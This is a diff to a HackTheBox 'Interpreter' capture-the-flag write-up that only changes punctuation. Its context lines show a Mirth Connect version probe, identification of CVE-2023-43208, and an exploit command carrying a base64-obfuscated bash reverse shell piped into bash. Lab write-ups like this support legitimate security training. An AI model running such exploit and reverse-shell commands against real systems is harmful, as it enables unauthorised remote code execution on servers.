@@ -57,7 +57,7 @@ curl -sk https://[REDACTED]/api/server/version -H 'X-Requested-With: XMLHttpRequ
 
 ![Interpreter](htb_interpreter_version.png)
 
-Mirth Connect 4.4.0 — that's vulnerable to **CVE-2023-43208**, a pre-auth RCE through Java XStream deserialization. This is a well-documented vulnerability with public exploits.
+Mirth Connect 4.4.0 : that's vulnerable to **CVE-2023-43208**, a pre-auth RCE through Java XStream deserialization. This is a well-documented vulnerability with public exploits.
 
 ## Foothold — CVE-2023-43208 (Mirth Connect Pre-Auth RCE)
 
@@ -81,7 +81,7 @@ python3 CVE-2023-43208.py -u https://[REDACTED] \
   -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9bUkVXXXXXXXXXXXXXXXXXXwMDEgMD4mMQo=}|{base64,-d}|{bash,-i}"
 ```
 
-Shell as **mirth** — a service account that runs the Mirth Connect Java process.
+Shell as **mirth** : a service account that runs the Mirth Connect Java process.
 
 ![Interpreter](htb_interpreter_mirth.png)
 
